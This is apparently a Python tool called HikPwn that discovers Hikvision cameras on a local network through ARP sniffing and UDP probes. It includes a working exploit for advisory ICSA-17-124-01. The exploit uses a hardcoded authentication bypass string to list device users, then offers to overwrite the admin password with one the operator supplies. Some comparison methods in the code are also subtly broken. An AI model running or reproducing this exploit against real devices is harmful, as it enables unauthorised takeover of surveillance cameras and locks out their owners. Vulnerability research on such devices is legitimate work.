#!/usr/bin/python3
"""HikPwn, a simple scanner for Hikvision devices with basic vulnerability scanning capabilities written in Python 3.8.\n """

# Written By Ananke: https://github.com/4n4nk3
import argparse
from collections import OrderedDict
from functools import total_ordering
from getpass import getpass
from ipaddress import ip_address, IPv4Address
from sys import exit as sysexit
from time import sleep
from typing import Dict

from lxml import etree
from requests import exceptions as rexceptions
from requests import get as rget
from requests import put as rput
from scapy.all import *


@total_ordering
class HikDevice:
    """Hikvision Device Object to hold the informations that we acquire about it.\n"""

    def __init__(self, ip_a, description=None, serial_number=None, mac=None, ip_mask=None,
                 ip_gateway=None, dhcp=None, software_version=None, dsp_version=None,
                 boot_time=None, activation_status=None, password_reset_ability=None,
                 arp_req_target=None):
        self.ip_a = ip_a if isinstance(ip_a, IPv4Address) else ip_address(ip_a)
        self.description = description
        self.serial_number = serial_number
        self.mac = mac
        self.ip_mask = ip_mask
        self.ip_gateway = ip_gateway
        self.dhcp = dhcp
        self.software_version = software_version
        self.dsp_version = dsp_version
        self.boot_time = boot_time
        self.activation_status = activation_status
        self.password_reset_ability = password_reset_ability
        self.arp_req_target = arp_req_target
        self.user_list = set()

    def __eq__(self, other):
        return (self.ip_a(), self.mac()) == (other.ip_a(), other.mac())

    def __lt__(self, other):
        return self.ip_a() < other.ip_a()


@total_ordering
class HikUser:
    """Hikvision User Object to hold the information that we acquire about it.\n"""

    def __init__(self, user_id=None, user_name=None, priority=None, user_level=None):
        self.user_id = user_id
        self.user_name = user_name
        self.priority = priority
        self.user_level = user_level

    def __eq__(self, other):
        return (self.user_id(), self.user_name()) == (other.user_id(), other.user_name())

    def __lt__(self, other):
        return self.user_id() < other.user_id()

    def __hash__(self):
        return hash((self.user_id, self.user_name, self.user_level))


HIK_KNOWN_HW = {
    'c4:2f:90': 'Hangzhou Hikvision Digital Technology Co.,Ltd.',
    'c0:56:e3': 'Hangzhou Hikvision Digital Technology Co.,Ltd.',
    'bc:ad:28': 'Hangzhou Hikvision Digital Technology Co.,Ltd.',
    'b4:a3:82': 'Hangzhou Hikvision Digital Technology Co.,Ltd.',
    'a4:14:37': 'Hangzhou Hikvision Digital Technology Co.,Ltd.',
    '54:c4:15': 'Hangzhou Hikvision Digital Technology Co.,Ltd.',
    '4c:bd:8f': 'Hangzhou Hikvision Digital Technology Co.,Ltd.',
    '44:19:b6': 'Hangzhou Hikvision Digital Technology Co.,Ltd.',
    '28:57:be': 'Hangzhou Hikvision Digital Technology Co.,Ltd.',
    '18:68:cb': 'Hangzhou Hikvision Digital Technology Co.,Ltd.'
}

DETECTED_PASSIVE: Dict[str, HikDevice] = {}
DETECTED_ACTIVE: Dict[str, HikDevice] = {}


def init_argparse() -> argparse.ArgumentParser:
    """Define and manage arguments passed to HikPwn via terminal.\n"""
    # Description
    parser = argparse.ArgumentParser(
        description='HikPwn, a simple scanner for Hikvision devices with basic vulnerability '
                    'scanning capabilities written in Python 3.8. by Ananke: '
                    'https://github.com/4n4nk3.')
    # Required arguments
    parser.add_argument('--interface', help='the network interface to use', required=True)
    parser.add_argument('--address', help='the ip address of the selected network interface',
                        required=True)
    # Optional arguments
    parser.add_argument('--active', help='enable "active" discovery', required=False,
                        action='store_true')
    # Optional arguments
    parser.add_argument('--ICSA_17_124_01',
                        help='enable ICSA-17-124-01 detection on discovered devices',
                        required=False, action='store_true')
    return parser


def check_pkt_passive(pkt):
    """Function executed to check if passively sniffed ARP packets come from Hikvision devices.\n"""
    global DETECTED_PASSIVE
    if pkt[ARP].hwsrc[:8] in HIK_KNOWN_HW:
        ip_a = pkt[ARP].psrc
        if ip_a not in DETECTED_PASSIVE:
            DETECTED_PASSIVE[ip_a] = HikDevice(ip_a=ip_a, mac=pkt[ARP].hwsrc,
                                               arp_req_target=pkt[ARP].pdst)


def check_pkt_active(pkt):
    """Function executed to extract data obtained by actively probing Hikvision devices.\n"""
    global DETECTED_ACTIVE
    try:
        response = pkt[UDP].load
        check_xmlroot = etree.fromstring(response)
        ip_a = check_xmlroot.find('IPv4Address').text
        description = check_xmlroot.find('DeviceDescription').text
        if ip_a not in DETECTED_ACTIVE:
            DETECTED_ACTIVE[ip_a] = HikDevice(ip_a=ip_a,
                                              description=description,
                                              serial_number=check_xmlroot.find('DeviceSN').text[
                                                            len(description):],
                                              mac=check_xmlroot.find('MAC').text.replace('-', ':'),
                                              ip_mask=check_xmlroot.find('IPv4SubnetMask').text,
                                              ip_gateway=check_xmlroot.find('IPv4Gateway').text,
                                              dhcp=check_xmlroot.find('DHCP').text,
                                              software_version=check_xmlroot.find(
                                                  'SoftwareVersion').text,
                                              dsp_version=check_xmlroot.find('DSPVersion').text,
                                              boot_time=check_xmlroot.find('BootTime').text,
                                              activation_status=check_xmlroot.find(
                                                  'Activated').text,
                                              password_reset_ability=check_xmlroot.find(
                                                  'PasswordResetAbility').text)
    except Exception as exception:
        print(exception)
        print('[!] Error: in check_pkt_active')


def passive_detect():
    """Passively sniff for ARP packets and check if they come from Hikvision devices.\n"""
    if ARGS.active is not True:
        print('[*] Started 30 seconds of passive discovery...\n')
    try:
        sniff(filter='arp', iface=ARGS.interface, prn=check_pkt_passive, store=0, timeout=30)
    except Exception as exception:
        print(exception)
        print('[!] Error: Failed to Initialize Sniffing in passive_detect')
        sysexit(1)


def active_detect_by_probe():
    """Passively sniff for UDP packets sent by Hikvision devices in response to our probes.\n"""
    wire_filter = 'udp and port 37020 and not host 239.255.255.250'
    try:
        sniff(filter=wire_filter, iface=ARGS.interface, prn=check_pkt_active, store=0, timeout=30)
    except Exception as exception:
        print(exception)
        print('[!] Error: Failed to Initialize Sniffing in active_detect_by_probe')
        sysexit(1)


def send_probe() -> bool:
    """Actively send specific packet probes to all Hikvision devices reachable in LAN.\n"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP
        sock.bind((ARGS.address, 37020))
        # Uuid is arbitrary and it will be reused by the Hikvision devices inside their responses
        probe = '<?xml version="1.0" encoding="utf-8"?><Probe><Uuid>LEET-HAXOR</Uuid>' \
                '<Types>inquiry</Types></Probe>'
        sock.sendto(bytes(probe, 'utf-8'), ('239.255.255.250', 37020))
        return True
    except Exception as exception:
        print(exception)
        print('[!] Error: Failed to send_probe. Active discovery will probably fail.')
        return False


def icsa_17_124_01(target, action) -> bool:
    """Detect vulnerability ICSA-17-124-01 or exploit it to change 'admin' password.\n"""
    global HOSTS
    ip_a = str(target)
    params = {'auth': 'YWRtaW46MTEK'}
    if action == 'detect':
        url = f'http://{ip_a}/Security/users'
        try:
            r = rget(url=url, params=params, timeout=10)
            if r.status_code == 200:
                try:
                    r_xmlroot = etree.fromstring(r.content)
                    for actual_user in r_xmlroot:
                        HOSTS[ip_a].user_list.add(HikUser(user_id=actual_user.find('id').text,
                                                          user_name=actual_user.find(
                                                              'userName').text,
                                                          priority=actual_user.find(
                                                              'priority').text,
                                                          user_level=actual_user.find(
                                                              'userLevel').text))
                    return True
                except Exception as exception:
                    print(exception)
                    print('[!] Error: Failed to understand device response and enumerate users.\nResponse:')
                    print(r.content)
                    return False
            else:
                return False
        except rexceptions.Timeout:
            print('Connection timed out! Host may no be reachable.')
            return False
    elif action == 'password_change':
        while True:
            psw = getpass(
                '\nEnter a password composed by numbers and letters (8-12 characters):\n\t>>> ')
            if 8 <= len(psw) <= 12:
                break
        url = f'http://{ip_a}/Security/users/1'
        xml = f'<User version="1.0" xmlns="http://www.hikvision.com/ver10/XMLSchema"><id>1</id>' \
              f'<userName>admin</userName><password>{psw}</password></User>'
        try:
            r = rput(url=url, params=params, data=xml, timeout=10)
            if r.status_code == 200:
                try:
                    r_xmlroot = etree.fromstring(r.content)
                    if int(r_xmlroot.find('statusCode').text) == 1 and r_xmlroot.find(
                            'statusString').text == 'OK':
                        return True
                except Exception as exception:
                    print(exception)
                    print(
                        '[!] Error: Failed to understand device response to psw change.\nResponse:')
                    print(r.content)
                    return False
            else:
                return False
        except rexceptions.Timeout:
            print('Connection timed out! Host may no be reachable.')
            return False


# Parsing arguments
ARGS = init_argparse().parse_args()

print(f'\nUsing {ARGS.interface} as network interface and {ARGS.address} as its IP address...\n')

# Defining and starting a thread for passive detection
THREAD1 = threading.Thread(name='sic1', target=passive_detect)
THREAD1.start()

if ARGS.active is True:
    # Defining and starting a thread for active detection.
    print('[*] Started 30 seconds of both passive and active discovery...')
    THREAD2 = threading.Thread(name='sic2', target=active_detect_by_probe)
    THREAD2.start()
    # While sniffing for probe responses, start sending probe requests every 5 seconds.
    while THREAD2.is_alive():
        sleep(2)
        if not THREAD2.is_alive() or send_probe() is False:
            break
        sleep(3)
    THREAD2.join()

# Wait for THREAD to finish in order not to loose any result by printing them before their capture
THREAD1.join()

# Sorting devices
DETECTED_ACTIVE = OrderedDict(sorted(DETECTED_ACTIVE.items()))
DETECTED_PASSIVE = OrderedDict(sorted(DETECTED_PASSIVE.items()))

# Printing results
print(f'\n{80 * "="}')
if not DETECTED_ACTIVE and not DETECTED_PASSIVE:
    print('[*] Both passive and active discovery didn\'t find any device.')
else:
    if DETECTED_PASSIVE or DETECTED_ACTIVE:
        # Create a sorted list of IPs eliminating duplicates by using a set())
        TOTAL = sorted(set().union(
            [DETECTED_ACTIVE[device].ip_a for device in DETECTED_ACTIVE],
            [DETECTED_PASSIVE[device].ip_a for device in DETECTED_PASSIVE]))
        print(f'[*] Total detected devices: {len(TOTAL)}\n')
        for device in TOTAL:
            print(f'\t{device}')

    print(f'\n\n{80 * "="}')
    if ARGS.active is True:
        if DETECTED_ACTIVE:
            print('[*] Active discovery\'s results:')
            for number, device in enumerate(DETECTED_ACTIVE):
                print(f'\nDEVICE #{number + 1}:\n\t{"LABEL":<25} {"DATA":<10}\n\t{50 * "-"}')
                for attribute, value in DETECTED_ACTIVE[device].__dict__.items():
                    if value is not None and attribute != 'user_list':
                        try:
                            print(f'\t{attribute:<25} {value:<10}')
                        except TypeError as err:
                            if attribute == 'ip_a':
                                print(f'\t{attribute:<25} {str(value):<10}')
                            else:
                                print('Unexpected exception!')
                                raise
        else:
            print('[*] Active discovery didn\'t find any device.')

    print(f'\n\n{80 * "="}')
    if DETECTED_PASSIVE:
        print('[*] Passive discovery\'s results:')
        for number, device in enumerate(DETECTED_PASSIVE):
            print(f'\nDEVICE #{number + 1}:')
            print(f'\tDetected a device with ip address {DETECTED_PASSIVE[device].ip_a}'
                  f' and MAC address {DETECTED_PASSIVE[device].mac}.')
    elif ARGS.active is not True or DETECTED_ACTIVE:
        print('[*] Passive discovery didn\'t find any device.')

    HOSTS = {**DETECTED_PASSIVE, **DETECTED_ACTIVE}

    # ICS-17-124-01 exploitation
    if ARGS.ICSA_17_124_01 is True:
        print(f'\n\n{80 * "="}')
        print('[*] Starting scan for ICSA-17-124-01...')
        positive = set()
        for device in HOSTS:
            print(
                f'\nChecking if {HOSTS[device].ip_a} is vulnerable to ICSA-17-124-01 and if we can '
                'get a list of valid users present on the device...')
            if icsa_17_124_01(HOSTS[device].ip_a, 'detect'):
                print(f'{device} is vulnerable to ICSA_17_124_01. Recovered user list:')
                for number, user in enumerate(HOSTS[device].user_list):
                    if number >= 1:
                        print()
                    for attribute, value in user.__dict__.items():
                        if value is not None:
                            print(f'\t{attribute:<25} {value:<10}')
                choice = input(
                    '\nDo you want to exploit the vulnerability and try to change admin\'s'
                    ' password? (y/n)\n\t>>> ')
                if choice == 'y':
                    if icsa_17_124_01(HOSTS[device].ip_a, 'password_change'):
                        print('Password change successful.')
                    else:
                        print('Password change unsuccessful.')
            else:
                print(f'{device} may not be vulnerable to ICSA_17_124_01.')

    # Log whole achieved data appending it to 'log.txt'
    with open('log.txt', 'a') as logfile:
        for number, device in enumerate(HOSTS):
            print(f'\n\n{80 * "="}', file=logfile)
            print(f'\nDEVICE #{number + 1}:\n\t{"LABEL":<25} {"DATA":<10}\n\t{50 * "-"}',
                  file=logfile)
            for attribute, value in HOSTS[device].__dict__.items():
                if value is not None:
                    if attribute == 'user_list':
                        print('\n\tEnumerated users:', file=logfile)
                        for nested_number, item in enumerate(HOSTS[device].user_list):
                            if nested_number > 0:
                                print('', file=logfile)
                            for nested_attribute, nested_value in item.__dict__.items():
                                if nested_value is not None:
                                    print(f'\t{nested_attribute:<25} {nested_value:<10}',
                                          file=logfile)
                    else:
                        try:
                            print(f'\t{attribute:<25} {value:<10}', file=logfile)
                        except TypeError as err:
                            if attribute == 'ip_a':
                                print(f'\t{attribute:<25} {str(value):<10}', file=logfile)
                            else:
                                print('Unexpected exception!', file=logfile)
                                raise
